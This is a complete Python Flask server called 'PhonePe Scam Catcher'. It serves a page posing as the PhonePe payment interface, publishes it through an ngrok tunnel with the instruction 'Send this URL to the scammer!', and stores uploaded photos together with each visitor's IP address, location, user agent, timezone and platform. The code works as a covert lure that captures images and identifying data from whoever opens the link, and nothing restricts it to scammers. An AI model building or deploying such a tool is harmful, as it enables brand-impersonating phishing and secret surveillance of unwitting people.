#!/usr/bin/env python3
"""
PhonePe Scam Catcher - Simple Flask Application
"""

from flask import Flask, render_template, request, jsonify
import os
import json
import time
from datetime import datetime
import base64
import threading
import webbrowser
import atexit

# Try to import ngrok
ngrok = None
NGROK_AVAILABLE = False
try:
    from pyngrok import ngrok
    NGROK_AVAILABLE = True
    print("✅ Ngrok library loaded successfully")
except ImportError as e:
    print(f"⚠️  Ngrok not available: {e}")
    print("💡 To enable public URLs, install with: pip install pyngrok")
    print("   Then run: ngrok config add-authtoken YOUR_TOKEN")

# Configuration
PHOTOS_DIR = 'captured_photos'
PORT = 8080

# Ensure photos directory exists
os.makedirs(PHOTOS_DIR, exist_ok=True)

app = Flask(__name__,
           template_folder='templates',
           static_folder='static')

# Global variables for ngrok
public_url = None
ngrok_process = None

def save_capture_metadata(capture_id, photo_filename, metadata):
    """Save capture metadata to JSON file"""
    metadata_file = os.path.join(PHOTOS_DIR, f"{capture_id}_info.json")

    capture_data = {
        'capture_id': capture_id,
        'photo_filename': photo_filename,
        'timestamp': datetime.now().isoformat(),
        'ip_address': metadata.get('ip', request.remote_addr or 'Unknown'),
        'location': metadata.get('location', 'Unknown'),
        'user_agent': metadata.get('userAgent', request.headers.get('User-Agent', 'Unknown')),
        'screen_resolution': metadata.get('screenResolution', 'Unknown'),
        'timezone': metadata.get('timezone', 'Unknown'),
        'platform': metadata.get('platform', 'Unknown'),
    }

    with open(metadata_file, 'w') as f:
        json.dump(capture_data, f, indent=2)

    print(f"📸 SCAMMER CAPTURED!")
    print(f"   Photo: {photo_filename}")
    print(f"   IP: {capture_data['ip_address']}")
    print(f"   Location: {capture_data['location']}")
    print(f"   Time: {capture_data['timestamp']}")
    print(f"   Files saved in: {PHOTOS_DIR}/")
    print("-" * 50)

@app.route('/')
def index():
    """Serve the main PhonePe interface"""
    return render_template('index.html')

@app.route('/api/upload', methods=['POST'])
def upload_photo():
    """Handle photo upload from the frontend"""
    try:
        # Get the photo data
        photo_data = request.form.get('photo')
        metadata_str = request.form.get('metadata')

        if not photo_data:
            return jsonify({'error': 'No photo data provided'}), 400

        # Parse metadata
        try:
            metadata = json.loads(metadata_str) if metadata_str else {}
        except:
            metadata = {}

        # Generate unique capture ID
        timestamp = int(time.time() * 1000)
        capture_id = f"scam_{timestamp}"

        # Save photo
        photo_filename = f"{capture_id}.jpg"
        photo_path = os.path.join(PHOTOS_DIR, photo_filename)

        # Convert base64 to image
        image_data = photo_data.replace('data:image/jpeg;base64,', '')
        image_bytes = base64.b64decode(image_data)

        with open(photo_path, 'wb') as f:
            f.write(image_bytes)

        # Save metadata
        save_capture_metadata(capture_id, photo_filename, metadata)

        return jsonify({
            'success': True,
            'capture_id': capture_id,
            'message': f'Photo saved as {photo_filename}'
        })

    except Exception as e:
        print(f"Upload error: {e}")
        return jsonify({'error': 'Failed to save photo'}), 500

def start_ngrok():
    """Start ngrok tunnel"""
    global public_url, ngrok_process

    if not NGROK_AVAILABLE:
        print("❌ Ngrok not available. Install with: pip install pyngrok")
        return

    try:
        print("🚀 Starting ngrok tunnel...")
        ngrok_process = ngrok.connect(PORT, "http")
        public_url = ngrok_process.public_url
        print(f"✅ Public URL: {public_url}")
        print("📱 Send this URL to the scammer!")
        print("=" * 50)

        # Open the URL in browser for testing
        webbrowser.open(public_url)

    except Exception as e:
        print(f"❌ Ngrok error: {e}")
        print("💡 Make sure you have an ngrok account and auth token set up")
        print("   Run: ngrok config add-authtoken YOUR_TOKEN")
        print("   Or download ngrok manually from https://ngrok.com")
        public_url = f"http://localhost:{PORT}"

def cleanup():
    """Clean up ngrok on exit"""
    global ngrok_process
    if ngrok_process and NGROK_AVAILABLE:
        try:
            ngrok.disconnect(ngrok_process.public_url)
            ngrok.kill()
        except:
            pass
        print("🧹 Ngrok tunnel closed")

def main():
    """Main function to run the server"""
    print("📱 PhonePe Scam Catcher")
    print("=" * 50)
    print(f"🌐 Local server: http://localhost:{PORT}")
    print(f"📁 Photos will be saved in: {PHOTOS_DIR}/")
    print("=" * 50)

    # Start ngrok in background thread
    if NGROK_AVAILABLE:
        ngrok_thread = threading.Thread(target=start_ngrok, daemon=True)
        ngrok_thread.start()
        # Give ngrok time to start
        time.sleep(3)
    else:
        print("⚠️  Ngrok not available - only local access")
        print("   Install with: pip install pyngrok")

    # Register cleanup function
    atexit.register(cleanup)

    print("🎣 Waiting for scammers...")
    print("Press Ctrl+C to stop")
    print("=" * 50)

    try:
        # Run Flask server
        app.run(host='0.0.0.0', port=PORT, debug=False)
    except KeyboardInterrupt:
        print("\n👋 Shutting down...")
    finally:
        cleanup()

if __name__ == '__main__':
    main()